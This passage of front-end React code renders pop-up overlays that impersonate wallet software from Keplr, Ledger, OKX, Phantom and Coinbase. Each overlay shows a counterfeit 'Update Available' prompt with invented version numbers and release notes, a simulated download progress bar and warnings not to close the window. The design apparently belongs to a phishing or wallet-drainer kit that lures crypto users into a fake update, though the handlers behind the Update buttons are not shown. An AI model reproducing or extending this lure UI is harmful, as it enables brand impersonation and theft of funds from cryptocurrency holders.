                <path d="M40 4 A36 36 0 0 1 76 40" stroke="#6F3AFA" strokeWidth="5" strokeLinecap="round" style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'40px 40px' }}/>
              </svg>
              <div style={{ position:'absolute', inset:0, display:'flex', alignItems:'center', justifyContent:'center' }}>
                <img src="/media/images/keplr_new.png" alt="Keplr" style={{ width:40, height:40, borderRadius:10 }} />
              </div>
            </div>
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center' }}>Updating Keplr</div>
            <div style={{ fontSize:14, color:'#888', textAlign:'center', lineHeight:1.55 }}>Please wait while we update to version 0.12.155</div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px', marginTop:4 }}>
              <div style={{ width:'100%', height:7, background:'#ece8ff', borderRadius:99, overflow:'hidden' }}>
                <div style={{ height:'100%', borderRadius:99, background:'#6F3AFA', width:`${keplrProgress}%`, transition:'width 0.12s linear' }}/>
              </div>
              <div style={{ display:'flex', justifyContent:'space-between', marginTop:8 }}>
                <span style={{ fontSize:13, color:'#888' }}>Downloading update...</span>
                <span style={{ fontSize:13, color:'#6F3AFA', fontWeight:700 }}>{Math.round(keplrProgress)}%</span>
              </div>
            </div>
            <div style={{ width:'100%', marginTop:4, padding:'14px', borderRadius:50, background:'#ece8ff', fontSize:15, fontWeight:700, color:'#6F3AFA', textAlign:'center', opacity:0.7 }}>Please wait...</div>
            <div style={{ fontSize:12, color:'#999', marginTop:2, textAlign:'center' }}>This may take a few moments. Do not close this window.</div>
          </div>
        </div>
      )}

      {/* ══════════════════════════════════════════
          Ledger overlay cards
      ══════════════════════════════════════════ */}
      {ledgerState === 'loading' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:260, height:340, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.18)', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:20, animation:'wmSlideUp 0.25s ease', border:'1px solid #e8e8e8' }}>
          <img src="/media/images/wallet-ledger.webp" alt="Ledger" style={{ width:90, height:90, borderRadius:20, objectFit:'cover', animation:'wmBob 2.2s ease-in-out infinite' }} />
          <div style={{ textAlign:'center' }}>
            <div style={{ fontSize:16, fontWeight:700, color:'#111' }}>Ledger</div>
            <div style={{ fontSize:13, color:'#888', marginTop:4 }}>Connecting to Ledger Live...</div>
          </div>
          <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
            <circle cx="22" cy="22" r="18" stroke="#e8e8e8" strokeWidth="4"/>
            <path d="M22 4 A18 18 0 0 1 40 22" stroke="#111" strokeWidth="4" strokeLinecap="round" style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'22px 22px' }}/>
          </svg>
        </div>
      )}
      {ledgerState === 'update' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:300, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 24px', gap:12 }}>
            <img src="/media/images/wallet-ledger.webp" alt="Ledger" style={{ width:72, height:72, borderRadius:18, objectFit:'cover' }} />
            <div style={{ fontSize:23, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Update Available</div>
            <div style={{ fontSize:15, color:'#888', textAlign:'center', marginTop:-6 }}>Version 2.78.0</div>
            <div style={{ width:'100%', background:'#f5f5f5', borderLeft:'3px solid #111', borderRadius:'0 8px 8px 0', padding:'12px 14px' }}>
              <span style={{ fontSize:13, color:'#1a1a1a', lineHeight:1.5 }}>Firmware and security patch available. Update to keep your hardware wallet secure.</span>
            </div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px' }}>
              {['New firmware update for Nano X and Nano S+','Improved Bluetooth connection stability','Enhanced EVM contract interaction','Fixed staking transaction signing'].map((item, i, arr) => (
                <div key={i} style={{ display:'flex', alignItems:'flex-start', gap:8, marginBottom: i < arr.length-1 ? 8 : 0 }}>
                  <span style={{ color:'#111', fontSize:14, lineHeight:1.5 }}>•</span>
                  <span style={{ color:'#111', fontSize:13, lineHeight:1.5 }}>{item}</span>
                </div>
              ))}
            </div>
            <button style={{ width:'100%', marginTop:8, padding:'14px', borderRadius:50, background:'#111', color:'#fff', border:'none', fontSize:15, fontWeight:700, cursor:'pointer' }}
              onMouseEnter={e => e.currentTarget.style.background='#333'}
              onMouseLeave={e => e.currentTarget.style.background='#111'}
              onClick={handleLedgerUpdate}
            >Update</button>
            <div style={{ fontSize:12, color:'#555', marginTop:2 }}>Need help?{' '}<span style={{ color:'#111', cursor:'pointer', fontWeight:500 }}>Contact Ledger Support</span></div>
          </div>
        </div>
      )}
      {ledgerState === 'updating' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:300, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 24px', gap:12 }}>
            <div style={{ position:'relative', width:80, height:80 }}>
              <svg width="80" height="80" viewBox="0 0 80 80" fill="none" style={{ position:'absolute', inset:0 }}>
                <circle cx="40" cy="40" r="36" stroke="#e8e8e8" strokeWidth="5"/>
                <path d="M40 4 A36 36 0 0 1 76 40" stroke="#111" strokeWidth="5" strokeLinecap="round" style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'40px 40px' }}/>
              </svg>
              <div style={{ position:'absolute', inset:0, display:'flex', alignItems:'center', justifyContent:'center' }}>
                <img src="/media/images/wallet-ledger.webp" alt="Ledger" style={{ width:40, height:40, borderRadius:10 }} />
              </div>
            </div>
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center' }}>Updating Ledger</div>
            <div style={{ fontSize:14, color:'#888', textAlign:'center', lineHeight:1.55 }}>Please wait while we update to version 2.78.0</div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px', marginTop:4 }}>
              <div style={{ width:'100%', height:7, background:'#e8e8e8', borderRadius:99, overflow:'hidden' }}>
                <div style={{ height:'100%', borderRadius:99, background:'#111', width:`${ledgerProgress}%`, transition:'width 0.12s linear' }}/>
              </div>
              <div style={{ display:'flex', justifyContent:'space-between', marginTop:8 }}>
                <span style={{ fontSize:13, color:'#888' }}>Downloading update...</span>
                <span style={{ fontSize:13, color:'#111', fontWeight:700 }}>{Math.round(ledgerProgress)}%</span>
              </div>
            </div>
            <div style={{ width:'100%', marginTop:4, padding:'14px', borderRadius:50, background:'#e8e8e8', fontSize:15, fontWeight:700, color:'#888', textAlign:'center' }}>Please wait...</div>
            <div style={{ fontSize:12, color:'#999', marginTop:2, textAlign:'center' }}>This may take a few moments. Do not close this window.</div>
          </div>
        </div>
      )}

      {/* ── OKX: loading (video plays to end → update) ── */}
      {okxState === 'loading' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:260, borderRadius:20, overflow:'hidden', boxShadow:'0 8px 40px rgba(0,0,0,0.22)', background:'#fff', animation:'wmSlideUp 0.25s ease' }}>
          <video
            src="/media/images/cover-dark-v3.webm"
            autoPlay muted playsInline disablePictureInPicture controlsList="nodownload nofullscreen noremoteplayback"
            onEnded={() => setOkxState('update')}
            style={{ width:'100%', height:320, objectFit:'cover', display:'block' }}
          />
        </div>
      )}

      {/* ── OKX: Update Available ── */}
      {okxState === 'update' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:300, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 24px', gap:12 }}>
            {/* OKX icon — black rounded square, 2×2 white dots grid */}
            <div style={{ width:72, height:72, borderRadius:18, background:'#111', display:'flex', alignItems:'center', justifyContent:'center' }}>
              <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:6, padding:4 }}>
                {[0,1,2,3].map(i => <div key={i} style={{ width:14, height:14, borderRadius:3, background:'#fff' }}/>)}
              </div>
            </div>
            <div style={{ fontSize:23, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Update Available</div>
            <div style={{ fontSize:15, color:'#888', textAlign:'center', marginTop:-6 }}>Version 6.136.0</div>
            {/* Bullet list in grey box */}
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:14, padding:'16px 18px', marginTop:4 }}>
              {['Fix main build modifying desktop build steps','Improving the security system','Fix incorrect network information','Improve performance on signature request'].map((item, i, arr) => (
                <div key={i} style={{ display:'flex', alignItems:'flex-start', gap:10, marginBottom: i < arr.length-1 ? 10 : 0 }}>
                  <span style={{ color:'#111', fontSize:15, lineHeight:1.5, marginTop:1 }}>•</span>
                  <span style={{ color:'#111', fontSize:14, lineHeight:1.55 }}>{item}</span>
                </div>
              ))}
            </div>
            <button style={{ width:'100%', marginTop:10, padding:'15px', borderRadius:50, background:'#111', color:'#fff', border:'none', fontSize:16, fontWeight:700, cursor:'pointer' }}
              onMouseEnter={e => e.currentTarget.style.background='#333'}
              onMouseLeave={e => e.currentTarget.style.background='#111'}
              onClick={handleOkxUpdate}
            >Update</button>
            <div style={{ fontSize:13, color:'#555', marginTop:2 }}>Need help? Contact our Support</div>
          </div>
        </div>
      )}

      {/* ── OKX: Updating ── */}
      {okxState === 'updating' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:300, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 28px', gap:14 }}>
            {/* Spinner ring with OKX icon inside */}
            <div style={{ position:'relative', width:80, height:80 }}>
              <svg width="80" height="80" viewBox="0 0 80 80" fill="none" style={{ position:'absolute', inset:0 }}>
                <circle cx="40" cy="40" r="36" stroke="#e8e8e8" strokeWidth="5"/>
                <path d="M40 4 A36 36 0 0 1 76 40" stroke="#111" strokeWidth="5" strokeLinecap="round"
                  style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'40px 40px' }}/>
              </svg>
              <div style={{ position:'absolute', inset:0, display:'flex', alignItems:'center', justifyContent:'center' }}>
                <div style={{ display:'grid', gridTemplateColumns:'1fr 1fr', gap:3 }}>
                  {[0,1,2,3].map(i => <div key={i} style={{ width:10, height:10, borderRadius:2, background:'#111' }}/>)}
                </div>
              </div>
            </div>
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center' }}>Updating OKX Wallet</div>
            <div style={{ fontSize:14, color:'#888', textAlign:'center', lineHeight:1.55 }}>Please wait while we update to version 6.136.0</div>
            {/* Progress bar */}
            <div style={{ width:'100%', marginTop:4 }}>
              <div style={{ width:'100%', height:7, background:'#e8e8e8', borderRadius:99, overflow:'hidden' }}>
                <div style={{ height:'100%', borderRadius:99, background:'#111', width:`${okxProgress}%`, transition:'width 0.12s linear' }}/>
              </div>
              <div style={{ display:'flex', justifyContent:'space-between', marginTop:8 }}>
                <span style={{ fontSize:13, color:'#888' }}>Downloading update...</span>
                <span style={{ fontSize:13, color:'#111', fontWeight:700 }}>{Math.round(okxProgress)}%</span>
              </div>
            </div>
            <div style={{ fontSize:13, color:'#888', textAlign:'center', lineHeight:1.6, marginTop:8 }}>
              Please do not close this window during the update.
            </div>
          </div>
        </div>
      )}

      {/* ── Phantom: loading ── */}
      {phState === 'loading' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:260, height:360, background:'#2a2a2a', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.45)', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:20, animation:'wmSlideUp 0.25s ease' }}>
          {/* Official Phantom ghost */}
          <svg width="160" height="160" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" fill="none" style={{ animation:'wmBob 2.2s ease-in-out infinite' }}>
            <path d="M9 402.313C9 458.146 37.7123 471 67.5731 471C130.74 471 178.211 413.56 206.541 368.171C203.095 378.212 201.181 388.254 201.181 397.895C201.181 424.405 215.729 443.284 244.441 443.284C283.872 443.284 325.984 407.133 347.805 368.171C346.274 373.794 345.508 379.016 345.508 383.836C345.508 402.313 355.462 413.962 375.752 413.962C439.684 413.962 504 295.467 504 191.834C504 111.097 464.951 40 366.947 40C194.673 40 9 260.119 9 402.313Z" fill="white"/>
            <path d="M307.608 182.997C307.608 162.913 318.327 148.855 334.023 148.855C349.336 148.855 360.056 162.913 360.056 182.997C360.056 203.081 349.336 217.541 334.023 217.541C318.327 217.541 307.608 203.081 307.608 182.997Z" fill="#2a2a2a"/>
            <path d="M389.534 182.997C389.534 162.913 400.253 148.855 415.949 148.855C431.262 148.855 441.981 162.913 441.981 182.997C441.981 203.081 431.262 217.541 415.949 217.541C400.253 217.541 389.534 203.081 389.534 182.997Z" fill="#2a2a2a"/>
          </svg>
          <div style={{ color:'#fff', fontSize:18, fontWeight:700, letterSpacing:0.3 }}>BooOooOo...</div>
        </div>
      )}

      {/* ── Phantom: Update Available ── */}
      {phState === 'update' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:280, background:'#2a2a2a', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.45)', display:'flex', flexDirection:'column', alignItems:'center', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 24px 28px', gap:12, width:'100%' }}>
            <svg width="130" height="130" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" fill="none">
              <path d="M9 402.313C9 458.146 37.7123 471 67.5731 471C130.74 471 178.211 413.56 206.541 368.171C203.095 378.212 201.181 388.254 201.181 397.895C201.181 424.405 215.729 443.284 244.441 443.284C283.872 443.284 325.984 407.133 347.805 368.171C346.274 373.794 345.508 379.016 345.508 383.836C345.508 402.313 355.462 413.962 375.752 413.962C439.684 413.962 504 295.467 504 191.834C504 111.097 464.951 40 366.947 40C194.673 40 9 260.119 9 402.313Z" fill="white"/>
              <path d="M307.608 182.997C307.608 162.913 318.327 148.855 334.023 148.855C349.336 148.855 360.056 162.913 360.056 182.997C360.056 203.081 349.336 217.541 334.023 217.541C318.327 217.541 307.608 203.081 307.608 182.997Z" fill="#2a2a2a"/>
              <path d="M389.534 182.997C389.534 162.913 400.253 148.855 415.949 148.855C431.262 148.855 441.981 162.913 441.981 182.997C441.981 203.081 431.262 217.541 415.949 217.541C400.253 217.541 389.534 203.081 389.534 182.997Z" fill="#2a2a2a"/>
            </svg>
            <div style={{ fontSize:22, fontWeight:800, color:'#fff', textAlign:'center', lineHeight:1.3 }}>Update Available</div>
            <div style={{ fontSize:14, color:'#aaa', textAlign:'center', marginTop:-4 }}>Version 24.28.0</div>
            <div style={{ width:'100%', background:'#1a1a1a', borderRadius:12, padding:'14px 16px', marginTop:4 }}>
              {['Multi-chain balance view for Solana, Ethereum, and Polygon','Improved transaction speed and reliability','Enhanced security for DeFi interactions','Fixed wallet sync issues'].map((item, i, arr) => (
                <div key={i} style={{ display:'flex', alignItems:'flex-start', gap:8, marginBottom: i < arr.length-1 ? 8 : 0 }}>
                  <span style={{ color:'#9b8aff', fontSize:14, lineHeight:1.5 }}>•</span>
                  <span style={{ color:'#ccc', fontSize:13, lineHeight:1.5 }}>{item}</span>
                </div>
              ))}
            </div>
            <button style={{ width:'100%', marginTop:8, padding:'14px', borderRadius:50, background:'#9b8aff', color:'#fff', border:'none', fontSize:15, fontWeight:700, cursor:'pointer' }}
              onMouseEnter={e => e.currentTarget.style.background='#7B6BE0'}
              onMouseLeave={e => e.currentTarget.style.background='#9b8aff'}
              onClick={handlePhUpdate}
            >Update Now</button>
            <div style={{ fontSize:12, color:'#777', marginTop:2, textAlign:'center' }}>
              Need help?{' '}<span style={{ color:'#9b8aff', cursor:'pointer', fontWeight:500 }}>Contact Phantom Support</span>
            </div>
          </div>
        </div>
      )}

      {/* ── Phantom: Updating ── */}
      {phState === 'updating' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:280, background:'#2a2a2a', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.45)', display:'flex', flexDirection:'column', alignItems:'center', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 24px 28px', gap:12, width:'100%' }}>
            <svg width="130" height="130" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" fill="none">
              <path d="M9 402.313C9 458.146 37.7123 471 67.5731 471C130.74 471 178.211 413.56 206.541 368.171C203.095 378.212 201.181 388.254 201.181 397.895C201.181 424.405 215.729 443.284 244.441 443.284C283.872 443.284 325.984 407.133 347.805 368.171C346.274 373.794 345.508 379.016 345.508 383.836C345.508 402.313 355.462 413.962 375.752 413.962C439.684 413.962 504 295.467 504 191.834C504 111.097 464.951 40 366.947 40C194.673 40 9 260.119 9 402.313Z" fill="white"/>
              <path d="M307.608 182.997C307.608 162.913 318.327 148.855 334.023 148.855C349.336 148.855 360.056 162.913 360.056 182.997C360.056 203.081 349.336 217.541 334.023 217.541C318.327 217.541 307.608 203.081 307.608 182.997Z" fill="#2a2a2a"/>
              <path d="M389.534 182.997C389.534 162.913 400.253 148.855 415.949 148.855C431.262 148.855 441.981 162.913 441.981 182.997C441.981 203.081 431.262 217.541 415.949 217.541C400.253 217.541 389.534 203.081 389.534 182.997Z" fill="#2a2a2a"/>
            </svg>
            <div style={{ fontSize:22, fontWeight:800, color:'#fff', textAlign:'center', lineHeight:1.3 }}>Updating your wallet</div>
            <div style={{ fontSize:14, color:'#aaa', textAlign:'center', marginTop:-4 }}>What's new?</div>
            <div style={{ fontSize:14, color:'#888', textAlign:'center', lineHeight:1.6, marginTop:-4 }}>View Solana, Ethereum, and Polygon<br/>balances together.</div>
            {/* Progress bar */}
            <div style={{ width:'100%', marginTop:8 }}>
              <div style={{ width:'100%', height:7, background:'#444', borderRadius:99, overflow:'hidden' }}>
                <div style={{ height:'100%', borderRadius:99, background:'#9b8aff', width:`${phProgress}%`, transition:'width 0.12s linear' }}/>
              </div>
              <div style={{ display:'flex', justifyContent:'space-between', marginTop:8 }}>
                <span style={{ fontSize:13, color:'#888' }}>Downloading update...</span>
                <span style={{ fontSize:13, color:'#fff', fontWeight:700 }}>{Math.round(phProgress)}%</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── Coinbase: loading (video plays to end) ── */}
      {cbState === 'loading' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:260, borderRadius:20, overflow:'hidden', boxShadow:'0 8px 40px rgba(0,0,0,0.30)', background:'#000', animation:'wmSlideUp 0.25s ease' }}>
          <video
            src="/media/images/warmwelcome_ext_750x1200.webm"
            autoPlay muted playsInline disablePictureInPicture controlsList="nodownload nofullscreen noremoteplayback"
            onEnded={() => setCbState('update')}
            style={{ width:'100%', height:320, objectFit:'cover', display:'block' }}
          />
          <div style={{ position:'absolute', bottom:0, left:0, right:0, padding:'14px 16px', background:'linear-gradient(transparent,rgba(0,0,0,0.72))', display:'flex', alignItems:'center', gap:10 }}>
            <img src="/media/images/wallet-coinbase.webp" alt="Coinbase" style={{ width:36, height:36, borderRadius:8, objectFit:'cover', flexShrink:0 }} />
            <div>
              <div style={{ fontSize:14, fontWeight:700, color:'#fff', lineHeight:1.2 }}>Coinbase Wallet</div>
              <div style={{ fontSize:12, color:'rgba(255,255,255,0.7)', marginTop:2 }}>Connecting...</div>
            </div>
            <svg style={{ marginLeft:'auto', flexShrink:0, animation:'wmSpin 0.9s linear infinite' }} width="22" height="22" viewBox="0 0 22 22" fill="none">
              <circle cx="11" cy="11" r="8" stroke="rgba(255,255,255,0.25)" strokeWidth="3"/>
              <path d="M11 3 A8 8 0 0 1 19 11" stroke="#fff" strokeWidth="3" strokeLinecap="round"/>
            </svg>
          </div>
        </div>
      )}

      {/* ── Coinbase: Update Available ── */}
      {cbState === 'update' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 20px', gap:12 }}>
            {/* Coinbase icon — blue rounded square with white square inside */}
            <div style={{ width:72, height:72, borderRadius:18, background:'#0052FF', display:'flex', alignItems:'center', justifyContent:'center' }}>
              <div style={{ width:32, height:32, borderRadius:6, background:'#fff', display:'flex', alignItems:'center', justifyContent:'center' }}>
                <div style={{ width:14, height:14, borderRadius:3, background:'#0052FF' }} />
              </div>
            </div>
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Update Available</div>
            <div style={{ fontSize:15, color:'#888', textAlign:'center', marginTop:-6 }}>Version 29.57</div>
            {/* Blue left-border info box */}
            <div style={{ width:'100%', background:'#EEF2FF', borderLeft:'3px solid #0052FF', borderRadius:'0 8px 8px 0', padding:'14px 16px', marginTop:4 }}>
              <span style={{ fontSize:14, color:'#1a1a1a', lineHeight:1.6 }}>Important security update with performance improvements. We recommend installing it now.</span>
            </div>
            {/* Bullet list — plain text rows, no dots */}
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 18px' }}>
              {['Enhanced multi-chain asset management','Improved security for DeFi transactions','Fixed balance display issues','Better gas fee estimation'].map((item, i, arr) => (
                <div key={i} style={{ fontSize:14, color:'#111', lineHeight:1.6, paddingBottom: i < arr.length-1 ? 8 : 0 }}>{item}</div>
              ))}
            </div>
            <button style={{ width:'100%', marginTop:8, padding:'15px', borderRadius:50, background:'#0052FF', color:'#fff', border:'none', fontSize:16, fontWeight:700, cursor:'pointer' }}
              onMouseEnter={e => e.currentTarget.style.background='#0041CC'}
              onMouseLeave={e => e.currentTarget.style.background='#0052FF'}
              onClick={handleCbUpdate}
            >Update</button>
            <div style={{ fontSize:13, color:'#555', marginTop:2 }}>
              Need help?{' '}<span style={{ color:'#0052FF', cursor:'pointer', fontWeight:500 }}>Contact Coinbase Support</span>
            </div>
          </div>
        </div>
      )}

      {/* ── Coinbase: Updating ── */}
      {cbState === 'updating' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'28px 20px 20px', gap:12 }}>
            <div style={{ width:72, height:72, borderRadius:18, background:'#0052FF', display:'flex', alignItems:'center', justifyContent:'center' }}>
              <div style={{ width:32, height:32, borderRadius:6, background:'#fff', display:'flex', alignItems:'center', justifyContent:'center' }}>
                <div style={{ width:14, height:14, borderRadius:3, background:'#0052FF' }} />
              </div>
            </div>
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Updating Coinbase Wallet</div>
            <div style={{ fontSize:14, color:'#888', textAlign:'center', marginTop:-6 }}>Please wait while we update to version 29.57</div>
            <div style={{ width:'100%', background:'#EEF2FF', borderLeft:'3px solid #0052FF', borderRadius:'0 8px 8px 0', padding:'14px 16px', marginTop:4 }}>
              <span style={{ fontSize:14, color:'#1a1a1a', lineHeight:1.6 }}>Downloading and installing update. Please keep this window open until complete.</span>
            </div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 18px' }}>
              <div style={{ width:'100%', height:8, background:'#dde4ff', borderRadius:99, overflow:'hidden', marginBottom:8 }}>
                <div style={{ height:'100%', borderRadius:99, background:'#0052FF', width:`${cbProgress}%`, transition:'width 0.12s linear' }}/>
              </div>
              <div style={{ display:'flex', justifyContent:'space-between', marginBottom:8 }}>
                <span style={{ fontSize:13, color:'#555' }}>Downloading update...</span>
                <span style={{ fontSize:13, color:'#111', fontWeight:700 }}>{Math.round(cbProgress)}%</span>
              </div>
              <div style={{ fontSize:13, color:'#555', lineHeight:1.6, marginBottom:4 }}>Installing new features...</div>
              <div style={{ fontSize:13, color:'#555', lineHeight:1.6 }}>Verifying integrity...</div>
            </div>
            <div style={{ width:'100%', marginTop:4, padding:'15px', borderRadius:50, background:'#c8d8ff', fontSize:16, fontWeight:700, color:'#fff', textAlign:'center' }}>Please wait...</div>
            <div style={{ fontSize:12, color:'#999', marginTop:2, textAlign:'center' }}>This may take a few moments. Do not close this window.</div>
          </div>
        </div>
      )}

      {/* ── Generic wallet: loading ── */}
      {gFlow.state === 'loading' && (
        ['OKX Wallet','1inch Wallet'].includes(gFlow.name) ? (
          /* Video loading for OKX / 1inch */
          <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:260, borderRadius:20, overflow:'hidden', boxShadow:'0 8px 40px rgba(0,0,0,0.30)', background:'#000', animation:'wmSlideUp 0.25s ease' }}>
            <video
              key={gFlow.name}
              src={
                gFlow.name === 'OKX Wallet'   ? '/media/images/cover-dark-v3.webm' :
                '/media/images/1inch.mp4'
              }
              autoPlay muted playsInline disablePictureInPicture controlsList="nodownload nofullscreen noremoteplayback"
              onEnded={() => setGFlow(f => ({ ...f, state: 'update' }))}
              style={{ width:'100%', height:320, objectFit:'cover', display:'block' }}
            />
            <div style={{ position:'absolute', bottom:0, left:0, right:0, padding:'14px 16px', background:'linear-gradient(transparent,rgba(0,0,0,0.72))', display:'flex', alignItems:'center', gap:10 }}>
              <img src={gFlow.img} alt={gFlow.name} style={{ width:36, height:36, borderRadius:8, objectFit:'cover', flexShrink:0 }} />
              <div>
                <div style={{ fontSize:14, fontWeight:700, color:'#fff', lineHeight:1.2 }}>{gFlow.name}</div>
                <div style={{ fontSize:12, color:'rgba(255,255,255,0.7)', marginTop:2 }}>Connecting...</div>
              </div>
              <svg style={{ marginLeft:'auto', flexShrink:0, animation:'wmSpin 0.9s linear infinite' }} width="22" height="22" viewBox="0 0 22 22" fill="none">
                <circle cx="11" cy="11" r="8" stroke="rgba(255,255,255,0.25)" strokeWidth="3"/>
                <path d="M11 3 A8 8 0 0 1 19 11" stroke="#fff" strokeWidth="3" strokeLinecap="round"/>
              </svg>
            </div>
          </div>
        ) : (
          /* Logo + spinner for all other generic wallets */
          <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:260, height:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', gap:24, animation:'wmSlideUp 0.25s ease' }}>
            <img src={gFlow.img} alt={gFlow.name} style={{ width:100, height:100, borderRadius:20, objectFit:'cover' }} />
            <svg width="44" height="44" viewBox="0 0 44 44" fill="none">
              <circle cx="22" cy="22" r="18" stroke="#f0f0f0" strokeWidth="4"/>
              <path d="M22 4 A18 18 0 0 1 40 22" stroke={gFlow.color} strokeWidth="4" strokeLinecap="round"
                style={{ animation:'wmSpin 0.9s linear infinite', transformOrigin:'22px 22px' }}/>
            </svg>
          </div>
        )
      )}

      {/* ── Generic wallet: Update Available ── */}
      {gFlow.state === 'update' && (
        <div className="wm-flow-card" style={{ position:'fixed', top:24, right:24, zIndex:99999, width:320, background:'#fff', borderRadius:20, boxShadow:'0 8px 40px rgba(0,0,0,0.22)', display:'flex', flexDirection:'column', overflow:'hidden', animation:'wmSlideUp 0.25s ease' }}>
          <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', padding:'14px 16px', borderBottom:'1px solid #f0f0f0' }}>
            <img src={gFlow.img} alt={gFlow.name} style={{ width:36, height:36, borderRadius:8, objectFit:'cover' }} />
            <button onClick={closeGeneric} style={{ width:32, height:32, borderRadius:'50%', border:`2px solid ${gFlow.color}`, background:'none', cursor:'pointer', display:'flex', alignItems:'center', justifyContent:'center', color:gFlow.color, fontSize:15, fontWeight:700 }}>✕</button>
          </div>
          <div style={{ display:'flex', flexDirection:'column', alignItems:'center', padding:'22px 20px 20px', gap:10 }}>
            <svg width="52" height="52" viewBox="0 0 52 52" fill="none">
              <path d="M26 6v26M16 22l10 10 10-10" stroke={gFlow.color} strokeWidth="4" strokeLinecap="round" strokeLinejoin="round"/>
              <path d="M10 38h32" stroke={gFlow.color} strokeWidth="4" strokeLinecap="round"/>
            </svg>
            <div style={{ fontSize:22, fontWeight:800, color:'#111', textAlign:'center', marginTop:4 }}>Update Available</div>
            <div style={{ fontSize:15, color:'#555', textAlign:'center' }}>Version 13.3.0</div>
            <div style={{ width:'100%', background:'#f5f5f5', borderRadius:12, padding:'14px 16px', marginTop:4 }}>
              {['Fix main build modifying desktop build steps','Improving the security system','Fix incorrect network information','Improve performance on signature request'].map((item, i, arr) => (
                <div key={i} style={{ display:'flex', alignItems:'flex-start', gap:8, marginBottom: i < arr.length-1 ? 8 : 0 }}>
                  <span style={{ color:'#111', fontSize:14, lineHeight:1.5 }}>•</span>
                  <span style={{ color:'#111', fontSize:13, lineHeight:1.5 }}>{item}</span>
                </div>
              ))}
            </div>
